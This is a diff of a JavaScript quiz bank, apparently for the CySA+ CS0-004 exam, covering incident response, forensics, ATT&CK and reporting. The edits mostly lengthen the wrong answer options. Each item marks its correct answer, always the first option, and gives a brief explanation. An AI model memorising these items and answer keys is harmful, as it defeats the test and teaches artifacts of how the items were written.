- {q:"Which secure coding practice BEST stops command injection?",o:["Avoid passing user input to a shell; use safe APIs with allow-listed input","Output encoding","Longer passwords","TLS"],a:0,e:"Don't build shell commands from input."},
+ {q:"What is a key advantage of DAST over SAST?",o:["It finds issues in the running app, including configuration problems","It needs the full source code, so it can trace every input to its sink","It runs before code is written","It never has false positives"],a:0,e:"Dynamic testing sees runtime behavior."},
+ {q:"Which secure coding practice BEST stops command injection?",o:["Avoid passing user input to a shell; use safe APIs with allow-listed input","Output encoding of every value the application writes back to the page","Longer passwords for the service account","TLS on every connection"],a:0,e:"Don't build shell commands from input."},
  {q:"Which CVSS metric would be 'Required' for a vulnerability that only triggers when a user opens a crafted file?",o:["User interaction","Privileges required","Scope","Attack complexity"],a:0,e:"UI:R."},
- {q:"Which has the MOST influence on priority for a flaw with a public exploit and active attacks?",o:["Exploitability and weaponization","The CVE number","Scanner vendor","Plugin age"],a:0,e:"Active exploitation raises urgency."},
+ {q:"Which has the MOST influence on priority for a flaw with a public exploit and active attacks?",o:["Exploitability and weaponization","The CVE number and the year it was published","Scanner vendor","Plugin age"],a:0,e:"Active exploitation raises urgency."},
  {q:"Which control type is a firewall?",o:["Technical, preventive","Managerial, detective","Physical, deterrent","Operational, corrective"],a:0,e:"Technology that blocks."},
  {q:"Security awareness training is which control category?",o:["Operational","Technical","Physical","Compensating"],a:0,e:"People carry it out (some frameworks call training managerial/administrative)."},
  {q:"What is the main risk of skipping patch testing?",o:["The patch may break production systems","Scanners stop working","CVSS scores rise","Licenses expire"],a:0,e:"Test before broad deployment."},
@@ -3107,7 +3148,7 @@ const QUIZ=[
  {q:"What are the four vertices of the Diamond Model?",o:["Adversary, capability, infrastructure, victim","People, process, technology, data","Recon, delivery, exploit, impact","Identify, protect, detect, respond"],a:0,e:"The four core features of every intrusion event."},
  {q:"An analyst uses a C2 domain from one incident to find other compromised companies using the same domain. Which Diamond Model concept?",o:["Pivoting from infrastructure","Weaponization","Kill chain reversal","Root cause analysis"],a:0,e:"Pivoting across vertices."},
  {q:"In the Diamond Model, custom malware and an exploit kit are examples of:",o:["Capability","Infrastructure","Victim","Adversary"],a:0,e:"Capability is the tooling."},
- {q:"In MITRE ATT&CK, what is a tactic?",o:["The adversary's goal, such as Persistence","A specific tool","A CVE","A log source"],a:0,e:"Tactics are the why; techniques are the how."},
+ {q:"In MITRE ATT&CK, what is a tactic?",o:["The adversary's goal, such as Persistence","A specific tool or malware family used","A CVE","A log source"],a:0,e:"Tactics are the why; techniques are the how."},
  {q:"T1053.005 is an example of:",o:["A sub-technique","A tactic","A CVE","A Diamond vertex"],a:0,e:"T1053 is the technique; .005 the sub-technique (Scheduled Task)."},
  {q:"An attacker dumps lsass.exe memory with procdump. Which ATT&CK tactic?",o:["Credential Access","Exfiltration","Initial Access","Impact"],a:0,e:"T1003.001 OS Credential Dumping: LSASS Memory."},
  {q:"An attacker uses PsExec over admin shares to reach other servers. Which tactic?",o:["Lateral Movement","Discovery","Collection","Reconnaissance"],a:0,e:"Moving between systems."},
@@ -3117,61 +3158,61 @@ const QUIZ=[
  {q:"A SOC maps all its detection rules to ATT&CK techniques to find which ones it can't see. What is this used for?",o:["Detection gap analysis","Risk transfer","CVSS scoring","Legal hold"],a:0,e:"Coverage mapping shows blind spots."},
  {q:"Which methodology is a peer-reviewed manual for testing operational security across people, physical, wireless and networks?",o:["OSSTMM","OWASP Testing Guide","ATT&CK","Kill Chain"],a:0,e:"Open Source Security Testing Methodology Manual."},
  {q:"A tester follows a guide covering authentication, session management, input validation and business logic testing of a web app. Which?",o:["OWASP Testing Guide","OSSTMM","Diamond Model","NIST 800-61"],a:0,e:"The OWASP Web Security Testing Guide."},
- {q:"What are the four phases of the NIST 800-61 incident response life cycle?",o:["Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity","Identify, Protect, Detect, Respond","Plan, Do, Check, Act","Recon, Delivery, Exploit, Impact"],a:0,e:"Learn the order."},
+ {q:"What are the four phases of the NIST 800-61 incident response life cycle?",o:["Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity","Identify, Protect, Detect, Respond and Recover, as in the NIST Cybersecurity Framework functions","Plan, Do, Check, Act","Recon, Delivery, Exploit, Impact"],a:0,e:"Learn the order."},
  {q:"Which phase includes building playbooks and running tabletop exercises?",o:["Preparation","Detection and Analysis","Containment","Post-Incident Activity"],a:0,e:"Done before incidents happen."},
  {q:"Which IR plan element answers 'who can take the payment server offline at 2 a.m.?'",o:["Authority and escalation roles","Lessons learned","Chain of custody","SLA"],a:0,e:"The plan must grant authority to act."},
  {q:"Email is suspected to be compromised during an incident. How should responders communicate?",o:["An out-of-band channel","Reply-all on corporate email","Public social media","The compromised system's chat"],a:0,e:"Don't let the attacker read your response."},
  {q:"Leadership walks through a ransomware scenario in a conference room to test decisions. What is this?",o:["Tabletop exercise","Full interruption test","Penetration test","Parallel test"],a:0,e:"Discussion-based exercise."},
- {q:"What is the main purpose of a playbook?",o:["Consistent, step-by-step response to a specific incident type","Calculating CVSS","Assigning blame","Replacing the IR plan"],a:0,e:"Standardized response."},
+ {q:"What is the main purpose of a playbook?",o:["Consistent, step-by-step response to a specific incident type","Calculating CVSS scores for every vulnerability found during an incident","Assigning blame","Replacing the IR plan"],a:0,e:"Standardized response."},
  {q:"Ransomware destroyed the ERP servers. Which plan guides rebuilding IT systems at the alternate site?",o:["Disaster recovery plan","Acceptable use policy","Vulnerability management policy","Change management policy"],a:0,e:"DR restores IT; BC keeps the business running."},
- {q:"What's the difference between an event and an incident?",o:["An incident is an event that violates policy or threatens security","They're the same","An event is always malicious","Incidents are only physical"],a:0,e:"Not every event is an incident."},
+ {q:"What's the difference between an event and an incident?",o:["An incident is an event that violates policy or threatens security","They're the same; both terms mean a confirmed attack on the organization","An event is always malicious","Incidents are only physical"],a:0,e:"Not every event is an incident."},
  {q:"Which document records who collected a disk image, when, and every transfer since?",o:["Chain of custody form","Legal hold notice","SLA","MOU"],a:0,e:"Chain of custody."},
- {q:"How do you prove a forensic image hasn't changed since collection?",o:["Compare its hash with the hash taken at acquisition","Check the file size","Look at the timestamp","Open it and read it"],a:0,e:"Matching hashes prove integrity."},
+ {q:"How do you prove a forensic image hasn't changed since collection?",o:["Compare its hash with the hash taken at acquisition","Check that the file size matches the original drive's size","Look at the timestamp","Open it and read it"],a:0,e:"Matching hashes prove integrity."},
  {q:"Legal counsel expects a lawsuit over a breach. What must they issue so related data isn't deleted?",o:["A legal hold","A chain of custody","A change request","An NDA"],a:0,e:"Legal hold overrides normal retention."},
  {q:"Why should analysts work on a copy of evidence rather than the original?",o:["To preserve the original's integrity","Copies are faster","Originals are encrypted","It's cheaper"],a:0,e:"Preservation."},
  {q:"Which factors are commonly used to rate incident severity?",o:["Functional impact, information impact, recoverability","CVSS, EPSS, KEV","Number of analysts on shift","Vendor and product"],a:0,e:"NIST's impact categories."},
  {q:"An incident exposed 2 million customer records but no systems are down. Which impact is HIGH?",o:["Information impact","Functional impact","Recoverability","None"],a:0,e:"Data was exposed."},
- {q:"According to the order of volatility, what should be collected FIRST?",o:["CPU registers and cache","Disk image","Backups","Remote logs"],a:0,e:"The shortest-lived data first."},
+ {q:"According to the order of volatility, what should be collected FIRST?",o:["CPU registers and cache","A full disk image of the host","Backups","Remote logs"],a:0,e:"The shortest-lived data first."},
  {q:"Which should be captured BEFORE imaging the disk?",o:["RAM","Archived backups","Network diagrams","Printed logs"],a:0,e:"Memory is more volatile."},
- {q:"Why should a compromised server usually NOT be powered off immediately?",o:["Memory evidence like running processes and connections would be lost","It voids the warranty","It speeds up the attacker","Logs are stored in RAM only"],a:0,e:"RAM holds critical evidence."},
- {q:"What does a write blocker do?",o:["Prevents any writes to the source drive while imaging","Encrypts the image","Speeds up imaging","Blocks malware"],a:0,e:"Protects the original."},
+ {q:"Why should a compromised server usually NOT be powered off immediately?",o:["Memory evidence like running processes and connections would be lost","It voids the warranty and makes the vendor refuse support for the hardware","It speeds up the attacker","Logs are stored in RAM only"],a:0,e:"RAM holds critical evidence."},
+ {q:"What does a write blocker do?",o:["Prevents any writes to the source drive while imaging","Encrypts the forensic image so only the case team can open it","Speeds up imaging","Blocks malware on the evidence drive"],a:0,e:"Protects the original."},
  {q:"Which tool analyzes a captured memory image for processes, connections and injected code?",o:["Volatility","Nmap","Nessus","Burp Suite"],a:0,e:"The standard memory forensics framework."},
  {q:"Volatility's malfind finds a private memory region marked PAGE_EXECUTE_READWRITE beginning with 'MZ' in explorer.exe. What does it suggest?",o:["Code injection into explorer.exe","Normal DLL loading","A disk error","A legitimate update"],a:0,e:"An executable in RWX private memory is a classic injection sign."},
  {q:"A process named scvhost.exe runs from C:\\Users\\Public. What technique is this?",o:["Masquerading","Process hollowing only","Pass-the-hash","Kerberoasting"],a:0,e:"Named to look like svchost.exe."},
- {q:"What is timeline analysis?",o:["Combining timestamped artifacts into one ordered sequence of events","Measuring how long IR took","Scheduling scans","Calculating MTTR"],a:0,e:"It shows what happened when."},
- {q:"A compromised cloud VM must be preserved. What's the BEST first evidence step?",o:["Snapshot its volumes and export the relevant audit logs","Terminate the instance","Rebuild it from the image","Change its instance type"],a:0,e:"Snapshots preserve state before changes."},
+ {q:"What is timeline analysis?",o:["Combining timestamped artifacts into one ordered sequence of events","Measuring how long each phase of the incident response took against the SLA","Scheduling scans","Calculating MTTR"],a:0,e:"It shows what happened when."},
+ {q:"A compromised cloud VM must be preserved. What's the BEST first evidence step?",o:["Snapshot its volumes and export the relevant audit logs","Terminate the instance and keep only the image it was built from","Rebuild it from the image","Change its instance type"],a:0,e:"Snapshots preserve state before changes."},
  {q:"What is the PRIMARY goal of containment?",o:["Stop the incident spreading while preserving evidence","Find the attacker's identity","Restore from backup","Write the final report"],a:0,e:"Limit damage."},
  {q:"Which containment action keeps an infected laptop running for forensics but stops it talking to other hosts?",o:["EDR network isolation","Power off","Wipe the drive","Unplug the power cord"],a:0,e:"Isolation preserves memory."},
  {q:"An attacker has a stolen session token for a cloud account. Resetting the password alone isn't enough. What else?",o:["Revoke all active sessions and tokens","Change the username","Disable logging","Delete the mailbox"],a:0,e:"Tokens stay valid until revoked."},
  {q:"Redirecting a malware family's C2 domain to a server you control is called:",o:["Sinkholing","Spoofing","Pharming","Tarpitting"],a:0,e:"Sinkholes cut C2 and show who's infected."},
- {q:"Why might a team delay containment to observe an attacker?",o:["To understand the full scope before acting, with leadership approval","To let the attacker finish","To save money","It's always required"],a:0,e:"Rare and risky; needs approval."},
- {q:"Which action belongs to eradication?",o:["Removing persistence and patching the exploited vulnerability","Isolating the host","Calling law enforcement","Writing lessons learned"],a:0,e:"Remove the attacker completely."},
- {q:"Why is re-imaging preferred over cleaning malware?",o:["You can't be certain cleaning removed everything","Cleaning is illegal","Re-imaging is slower","Antivirus can't clean"],a:0,e:"A known-good rebuild removes hidden persistence."},
+ {q:"Why might a team delay containment to observe an attacker?",o:["To understand the full scope before acting, with leadership approval","To let the attacker finish so the damage can be measured in full for insurance","To save money","It's always required"],a:0,e:"Rare and risky; needs approval."},
+ {q:"Which action belongs to eradication?",o:["Removing persistence and patching the exploited vulnerability","Isolating the host from the network and disabling the compromised accounts","Calling law enforcement","Writing lessons learned"],a:0,e:"Remove the attacker completely."},
+ {q:"Why is re-imaging preferred over cleaning malware?",o:["You can't be certain cleaning removed everything","Re-imaging is slower, which gives time for a full analysis","Cleaning is illegal","Antivirus can't clean"],a:0,e:"A known-good rebuild removes hidden persistence."},
  {q:"After restoring from backup, what should the team do?",o:["Monitor closely for re-infection or attacker return","Delete all logs","Turn off EDR","Close the incident immediately"],a:0,e:"Attackers often try to come back."},
- {q:"Backups from the last 3 weeks may contain the attacker's persistence. What should you do?",o:["Restore from a backup before the earliest compromise and validate it","Restore the newest backup","Skip backups","Restore all backups at once"],a:0,e:"Make sure the restore point is clean."},
- {q:"In what order should systems be restored after a large incident?",o:["By business priority and dependencies (identity and network first)","Alphabetically","Smallest first","Randomly"],a:0,e:"Core dependencies like AD and DNS come before apps."},
- {q:"What is the purpose of root cause analysis?",o:["Find the underlying reason the incident happened","Identify who to fire","Calculate the ransom","Restore data"],a:0,e:"Fix the cause, not just the symptom."},
+ {q:"Backups from the last 3 weeks may contain the attacker's persistence. What should you do?",o:["Restore from a backup before the earliest compromise and validate it","Restore the newest backup, then run a full antivirus scan before reconnecting it","Skip backups","Restore all backups at once"],a:0,e:"Make sure the restore point is clean."},
+ {q:"In what order should systems be restored after a large incident?",o:["By business priority and dependencies (identity and network first)","Smallest systems first, so the most servers are back online quickly","Alphabetically by hostname","In the order the tickets were opened"],a:0,e:"Core dependencies like AD and DNS come before apps."},
+ {q:"What is the purpose of root cause analysis?",o:["Find the underlying reason the incident happened","Identify which employee caused it so HR can act","Calculate the ransom","Restore data"],a:0,e:"Fix the cause, not just the symptom."},
  {q:"Asking 'why?' repeatedly until the underlying cause appears is the:",o:["5 whys technique","Diamond Model","Kill chain","Delphi method"],a:0,e:"A simple root cause technique."},
  {q:"When should the lessons-learned meeting happen?",o:["Soon after the incident while details are fresh","A year later","Only if the incident was severe and public","Never; it assigns blame"],a:0,e:"Within days to a couple of weeks."},
  {q:"Which output of lessons learned improves future response the MOST?",o:["Updated playbooks, detections and training","A list of people to blame","A deleted ticket","A new logo"],a:0,e:"Feed changes back into preparation."},
  {q:"An analyst confirms ransomware is real and identifies affected hosts. Which phase?",o:["Detection and Analysis","Preparation","Post-Incident Activity","Recovery"],a:0,e:"Confirming and scoping."},
  {q:"Blocking the C2 domain at DNS during an active incident is part of:",o:["Containment","Preparation","Lessons learned","Recovery"],a:0,e:"It stops the spread and control."},
- {q:"A responder finds the phishing email in 40 other inboxes during analysis. What should happen next?",o:["Expand the scope and contain all affected mailboxes and hosts","Ignore the others","Close the ticket","Wait for more reports"],a:0,e:"Scope drives containment."},
- {q:"Which artifact links a malicious file found on disk to the user who opened it, and when?",o:["Event logs and file system timestamps combined in a timeline","CVSS score","The SBOM","The DR plan"],a:0,e:"Timeline analysis."},
+ {q:"A responder finds the phishing email in 40 other inboxes during analysis. What should happen next?",o:["Expand the scope and contain all affected mailboxes and hosts","Close the ticket for the first mailbox and open new tickets as users report","Ignore the others","Wait for more reports"],a:0,e:"Scope drives containment."},
+ {q:"Which artifact links a malicious file found on disk to the user who opened it, and when?",o:["Event logs and file system timestamps combined in a timeline","The CVSS score and vector string of the exploited vulnerability","The SBOM of the application that opened the file","The disaster recovery plan"],a:0,e:"Timeline analysis."},
  {q:"A user's laptop was stolen, encrypted with BitLocker and with no sign of access. Which phase determines whether this is a reportable breach?",o:["Detection and Analysis","Eradication","Preparation","Recovery"],a:0,e:"Analysis determines impact and obligations."},
- {q:"Which BEST describes incident declaration?",o:["Formally deciding an event is an incident, which triggers the IR plan","Calling the press","Closing a ticket","Patching a server"],a:0,e:"Declaration starts the formal process."},
+ {q:"Which BEST describes incident declaration?",o:["Formally deciding an event is an incident, which triggers the IR plan","Calling the press and regulators as soon as any alert fires in the SIEM","Closing the ticket once the alert is triaged","Patching the affected server"],a:0,e:"Declaration starts the formal process."},
  {q:"Which Kill Chain phase does a malicious email attachment arriving in an inbox represent?",o:["Delivery","Weaponization","Installation","Actions on objectives"],a:0,e:"Sending the weapon to the target."},
  {q:"Which ATT&CK tactic covers ransomware encrypting files?",o:["Impact","Collection","Exfiltration","Discovery"],a:0,e:"T1486 Data Encrypted for Impact."},
  {q:"Which ATT&CK tactic covers uploading stolen data to cloud storage?",o:["Exfiltration","Collection","Impact","Persistence"],a:0,e:"Moving data out."},
- {q:"What should an IR plan's communication section define?",o:["Who communicates with whom, when and through which channels","Firewall rules","CVSS thresholds","Backup retention only"],a:0,e:"Communication rules."},
+ {q:"What should an IR plan's communication section define?",o:["Who communicates with whom, when and through which channels","Firewall rules and network segments to block during each phase of response","CVSS thresholds","Backup retention only"],a:0,e:"Communication rules."},
  {q:"Which exercise involves actually failing over systems to the DR site?",o:["A full or functional test","A tabletop","A walkthrough","A checklist review"],a:0,e:"Hands-on, not discussion."},
  {q:"Which hash algorithm is preferred today for evidence integrity?",o:["SHA-256","MD5","CRC32","ROT13"],a:0,e:"MD5 and SHA-1 have known collisions."},
  {q:"What is dwell time?",o:["How long an attacker was in the environment before detection","Time to restore backups","Length of a lessons-learned meeting","Time a scan runs"],a:0,e:"First activity to detection."},
  {q:"Which phase includes resetting credentials the attacker may have stolen?",o:["Eradication","Preparation","Detection","Lessons learned"],a:0,e:"Removing the attacker's means of access."},
- {q:"Why capture network connection state early?",o:["Connections close quickly and show C2 or lateral movement","They never change","Disks hold them forever","It's required by CVSS"],a:0,e:"It's volatile."},
+ {q:"Why capture network connection state early?",o:["Connections close quickly and show C2 or lateral movement","They never change, so they're the most reliable evidence on the system","Disks hold them forever","It's required by CVSS"],a:0,e:"It's volatile."},
  {q:"Which tool captures a bit-for-bit disk image on Linux?",o:["dd","grep","netstat","whois"],a:0,e:"dd copies raw blocks."},
- {q:"A team restores systems but the same intrusion recurs a week later. What was MOST likely skipped?",o:["Eradication and root cause remediation","Preparation","Detection","Reporting"],a:0,e:"The attacker's access or entry point remained."},
- {q:"Who should attend a lessons-learned meeting?",o:["Everyone involved in the response, including IT, security, legal and business owners as needed","Only the CISO","Only the attacker","Nobody"],a:0,e:"All responders contribute."}
+ {q:"A team restores systems but the same intrusion recurs a week later. What was MOST likely skipped?",o:["Eradication and root cause remediation","Preparation and the tabletop exercise program","Detection","Reporting"],a:0,e:"The attacker's access or entry point remained."},
+ {q:"Who should attend a lessons-learned meeting?",o:["Everyone involved in the response, including IT, security, legal and business owners as needed","Only the CISO and the incident commander, so findings stay confidential until the report","Only the analysts who found the incident","Only external auditors and the cyber insurer"],a:0,e:"All responders contribute."}
 ];
 
 registerModule({
@@ -3464,36 +3505,36 @@ const CARDS=[];DECKS.forEach(([k])=>G[k].forEach((c,i)=>CARDS.push({deck:k,id:k+
 
 const QUIZ=[
  {q:"The same OpenSSL finding reappears on new servers every month. What does the report's recurrence data MOST likely point to?",o:["An unpatched golden image or baseline","A scanner bug","Too many analysts","An expired license"],a:0,e:"Fix the source image so new builds aren't vulnerable."},
- {q:"Which report section would a system owner need MOST?",o:["Their affected hosts, findings and fix steps with deadlines","Company-wide trend charts","The CISO's budget","Threat actor attribution"],a:0,e:"Actionable detail for their systems."},
+ {q:"Which report section would a system owner need MOST?",o:["Their affected hosts, findings and fix steps with deadlines","Company-wide trend charts covering every business unit over the last year","The CISO's budget","Threat actor attribution"],a:0,e:"Actionable detail for their systems."},
  {q:"Which belongs in a vulnerability report for executives?",o:["Risk trends, SLO performance and decisions needed","Every plugin ID","Raw Nmap output","Packet captures"],a:0,e:"Executives need risk and asks, not raw data."},
  {q:"An auditor asks for proof that quarterly external scans happened. Which report?",o:["Compliance report","Incident report","Executive summary of an incident","Root cause analysis"],a:0,e:"Compliance reports evidence control operation."},
- {q:"Users keep reusing weak passwords that scans flag. Which action plan fits BEST?",o:["Awareness, education and training plus policy enforcement","More patching","A new firewall","Risk transfer"],a:0,e:"The cause is behavior."},
+ {q:"Users keep reusing weak passwords that scans flag. Which action plan fits BEST?",o:["Awareness, education and training plus policy enforcement","More frequent patching of the authentication servers and domain controllers","A new next-generation firewall","Risk transfer through cyber insurance"],a:0,e:"The cause is behavior."},
  {q:"A hospital's MRI controller can't be patched because only the manufacturer may modify it. Which inhibitor?",o:["Proprietary system","MOU","Degrading functionality","Business process interruption"],a:0,e:"Vendor-controlled system."},
- {q:"A contract with a hosting provider says it controls all changes to the servers. Which inhibitor applies?",o:["SLA / contractual agreement","Legacy system","Zero-day","Recurrence"],a:0,e:"Agreements can restrict remediation."},
+ {q:"A contract with a hosting provider says it controls all changes to the servers. Which inhibitor applies?",o:["SLA / contractual agreement","Legacy system (end of life)","Zero-day","Recurrence"],a:0,e:"Agreements can restrict remediation."},
  {q:"A patch fixes a vulnerability but breaks the label printing feature the warehouse depends on. Which inhibitor?",o:["Degrading functionality","Organizational governance","Proprietary system","MOU"],a:0,e:"The fix reduces functionality."},
- {q:"The fix requires 8 hours of downtime on the order system during peak season. Which inhibitor?",o:["Business process interruption","Legacy system","MOU","Recurrence"],a:0,e:"The business can't stop."},
+ {q:"The fix requires 8 hours of downtime on the order system during peak season. Which inhibitor?",o:["Business process interruption","Legacy system with no vendor support","MOU","Recurrence"],a:0,e:"The business can't stop."},
  {q:"An emergency patch waits two weeks for the monthly change board. Which inhibitor?",o:["Organizational governance","Degrading functionality","Proprietary system","SLA"],a:0,e:"Process and approvals slow it down. Consider an emergency change process."},
  {q:"Windows Server 2008 can't receive patches. Which inhibitor?",o:["Legacy system","Proprietary system","MOU","Business process interruption"],a:0,e:"End of support."},
  {q:"Two departments sign a document agreeing on how a shared system is managed. What is it?",o:["MOU","SLA","NDA","SOW"],a:0,e:"Memorandum of understanding."},
  {q:"What's the difference between a metric and a KPI?",o:["A KPI is a metric tied to a specific goal","They're identical","KPIs are always financial","Metrics are only for executives"],a:0,e:"KPIs measure progress toward objectives."},
- {q:"Which KPI BEST shows whether remediation meets policy?",o:["Percentage of criticals fixed within the SLO","Number of scans run","Scanner license count","Number of plugins"],a:0,e:"SLO compliance measures performance against targets."},
+ {q:"Which KPI BEST shows whether remediation meets policy?",o:["Percentage of criticals fixed within the SLO","Number of scans run each month across all assets","Scanner license count","Number of plugins"],a:0,e:"SLO compliance measures performance against targets."},
  {q:"A chart shows open critical vulnerabilities by month for a year. What kind of metric is it?",o:["Trend","Top 10","Zero-day count","MTTD"],a:0,e:"Change over time."},
  {q:"Which report helps identify the teams or hosts contributing the most risk?",o:["Top 10 most vulnerable hosts/owners","MTTR trend","Compliance attestation","Change log"],a:0,e:"Top 10 lists focus effort."},
- {q:"Why report the number of zero-days affecting the environment?",o:["They need compensating controls since no patch exists","They're always low risk","They don't affect SLOs","They're already fixed"],a:0,e:"No patch means other controls and monitoring."},
+ {q:"Why report the number of zero-days affecting the environment?",o:["They need compensating controls since no patch exists","They're always low risk, since no attacker knows about them yet","They don't affect SLOs","They're already fixed"],a:0,e:"No patch means other controls and monitoring."},
  {q:"Which stakeholder needs code-level guidance on fixing an XSS flaw?",o:["Developers","Executives","Legal","PR"],a:0,e:"Developers fix code."},
  {q:"What formally starts the incident response process?",o:["Incident declaration","Lessons learned","A KPI review","A vulnerability scan"],a:0,e:"Declaration triggers the plan."},
  {q:"An incident now involves customer payment data. According to most IR plans, what happens?",o:["Escalate to management, legal and compliance","Keep it within the SOC","Close it","Wait a week"],a:0,e:"Sensitive data and regulatory duties trigger escalation."},
- {q:"Which belongs in an executive summary?",o:["Business impact, current status and decisions needed, in plain language","SHA-256 hashes of every file","Full packet captures","Volatility plugin output"],a:0,e:"Technical detail goes in later sections."},
+ {q:"Which belongs in an executive summary?",o:["Business impact, current status and decisions needed, in plain language","SHA-256 hashes of every collected file, with the chain of custody forms attached","Full packet captures","Volatility plugin output"],a:0,e:"Technical detail goes in later sections."},
  {q:"In which time zone should an incident timeline be written?",o:["UTC, consistently","Each source's local time","Whatever the analyst prefers","Eastern time"],a:0,e:"One time zone avoids confusion."},
  {q:"Which report section lists the systems, accounts and data affected?",o:["Scope","Recommendations","Executive summary","Evidence"],a:0,e:"Scope is what was touched."},
  {q:"Which report section says 'Deploy phishing-resistant MFA to all admins by March 31 (owner: IAM team)'?",o:["Recommendations","Timeline","Impact","Scope"],a:0,e:"Actionable changes with owners and dates."},
  {q:"The '5 Ws' in an incident report are:",o:["Who, what, when, where, why","Weakness, worm, web, wire, wipe","Week, work, wage, wait, why","Who, what, which, way, while"],a:0,e:"Core facts."},
  {q:"A reporter calls an analyst during an incident. What should the analyst do?",o:["Refer them to the designated PR spokesperson","Give a technical briefing","Deny any incident","Post on social media"],a:0,e:"One approved voice."},
  {q:"Who should be involved EARLY to advise on notification obligations and privilege?",o:["Legal","Marketing","Facilities","The vendor"],a:0,e:"Legal counsel."},
- {q:"Under GDPR, how quickly must a controller usually notify the supervisory authority of a personal data breach?",o:["Within 72 hours of becoming aware","Within 30 days","Within 1 year","Never"],a:0,e:"72 hours, where feasible."},
+ {q:"Under GDPR, how quickly must a controller usually notify the supervisory authority of a personal data breach?",o:["Within 72 hours of becoming aware","Within 30 days of the breach being confirmed","Within 1 year","Never"],a:0,e:"72 hours, where feasible."},
  {q:"A US public company determines a cyber incident is material. How soon must it file Form 8-K?",o:["Within 4 business days of the materiality determination","Within 72 hours of detection","Within 60 days","At the next annual report"],a:0,e:"SEC rule (Item 1.05)."},
- {q:"Under HIPAA, affected individuals must be notified of a breach of unsecured PHI:",o:["Without unreasonable delay and no later than 60 days after discovery","Within 24 hours","Within 1 year","Only if more than 500 people"],a:0,e:"60-day outer limit."},
- {q:"A merchant suffers a card data breach. Who do they typically notify for PCI DSS?",o:["The card brands through their acquiring bank","The ISAC only","Nobody","The scanner vendor"],a:0,e:"Through the acquirer."},
+ {q:"Under HIPAA, affected individuals must be notified of a breach of unsecured PHI:",o:["Without unreasonable delay and no later than 60 days after discovery","Within 24 hours of discovery, by phone, to every affected individual","Within 1 year","Only if more than 500 people"],a:0,e:"60-day outer limit."},
+ {q:"A merchant suffers a card data breach. Who do they typically notify for PCI DSS?",o:["The card brands through their acquiring bank","The ISAC for their sector, which informs the brands","Nobody","The scanner vendor"],a:0,e:"Through the acquirer."},
  {q:"Which agency is typically contacted in the US for a ransomware attack?",o:["FBI","FCC","FDA","EPA"],a:0,e:"The FBI (or Secret Service for financial crime)."},
  {q:"Why decide with legal before contacting law enforcement?",o:["It can affect evidence handling, timing and disclosure","Law enforcement is never involved","It's cheaper","It avoids the IR plan"],a:0,e:"Coordination matters."},
  {q:"Customers must be told about a breach. Who should approve the message?",o:["Legal and PR, per the IR plan","The first analyst who found it","The attacker","The help desk alone"],a:0,e:"Approved, accurate messaging."},
@@ -3508,15 +3549,15 @@ const QUIZ=[
  {q:"Which CS0-004 domain has the highest weight?",o:["Security Operations (34%)","Vulnerability Management (26%)","Incident Response (24%)","Reporting (16%)"],a:0,e:"Security Operations."},
  {q:"How many questions and minutes does CS0-004 have?",o:["Up to 85 questions, 165 minutes","90 questions, 90 minutes","100 questions, 120 minutes","50 questions, 45 minutes"],a:0,e:"Same as CS0-003."},
  {q:"Which domain's weight grew the most from CS0-003 to CS0-004?",o:["Incident Response and Management","Vulnerability Management","Reporting and Communication","Security Operations"],a:0,e:"20% to 24%."},
- {q:"Which metric would BEST show leadership that remediation is improving?",o:["A falling trend in mean age of open critical vulnerabilities","Number of scanners","Number of plugins","Report length"],a:0,e:"Trends tied to goals."},
- {q:"A report lists 'Top 10 vulnerabilities across the enterprise'. What's its main use?",o:["Focusing remediation effort where it removes the most risk","Proving compliance alone","Calculating MTTD","Replacing the scan"],a:0,e:"Prioritize common findings."},
- {q:"Which BEST describes an action plan in a vulnerability report?",o:["The specific steps, owners and dates to fix findings","A list of CVEs only","The scanner configuration","The incident timeline"],a:0,e:"What will be done, by whom, by when."},
- {q:"During an incident, who should approve public statements?",o:["Leadership with legal and PR","Any analyst","The help desk","The vendor"],a:0,e:"Approved communications only."},
- {q:"Which item belongs in the evidence section of an incident report?",o:["What was collected, hashes and chain of custody references","Marketing plans","Budget requests","Employee reviews"],a:0,e:"Preserved evidence details."},
- {q:"Why should an incident report include a timeline?",o:["It shows the sequence of attacker and responder actions for analysis and legal needs","It's decorative","It replaces the executive summary","CVSS requires it"],a:0,e:"Sequence matters."},
+ {q:"Which metric would BEST show leadership that remediation is improving?",o:["A falling trend in mean age of open critical vulnerabilities","The number of scanners and scan engines deployed across the network","Number of plugins","Report length"],a:0,e:"Trends tied to goals."},
+ {q:"A report lists 'Top 10 vulnerabilities across the enterprise'. What's its main use?",o:["Focusing remediation effort where it removes the most risk","Proving compliance alone, since auditors only check the top ten findings","Calculating MTTD","Replacing the scan"],a:0,e:"Prioritize common findings."},
+ {q:"Which BEST describes an action plan in a vulnerability report?",o:["The specific steps, owners and dates to fix findings","A list of CVEs only, sorted by CVSS base score","The scanner configuration","The incident timeline"],a:0,e:"What will be done, by whom, by when."},
+ {q:"During an incident, who should approve public statements?",o:["Leadership with legal and PR","Any analyst working the case","The help desk","The vendor"],a:0,e:"Approved communications only."},
+ {q:"Which item belongs in the evidence section of an incident report?",o:["What was collected, hashes and chain of custody references","Marketing plans and the customer communication schedule for the breach","Budget requests","Employee performance reviews"],a:0,e:"Preserved evidence details."},
+ {q:"Why should an incident report include a timeline?",o:["It shows the sequence of attacker and responder actions for analysis and legal needs","It replaces the executive summary, so leadership can skip the rest of the report","It's decorative","CVSS requires it"],a:0,e:"Sequence matters."},
  {q:"An incident is escalated because the media started asking questions. What triggered the escalation?",o:["Public or media attention","CVSS score","Scanner output","A KPI"],a:0,e:"A common escalation trigger."},
  {q:"Which stakeholder typically decides if an incident is 'material' for SEC reporting?",o:["Company leadership with legal advice","A SOC analyst","The scanner vendor","The ISP"],a:0,e:"A business and legal decision."},
- {q:"What does a rising mean time to respond suggest?",o:["Containment is getting slower, perhaps due to staffing or unclear playbooks","Detection improved","Fewer attacks","Better patching"],a:0,e:"Look at process and resources."},
+ {q:"What does a rising mean time to respond suggest?",o:["Containment is getting slower, perhaps due to staffing or unclear playbooks","Detection is improving, because analysts now find more incidents earlier","Fewer attacks are reaching the environment","Patching is getting faster"],a:0,e:"Look at process and resources."},
  {q:"Which report audience needs the LEAST technical detail?",o:["The board of directors","Incident responders","System administrators","Developers"],a:0,e:"Boards need risk and decisions."}
 ];
 
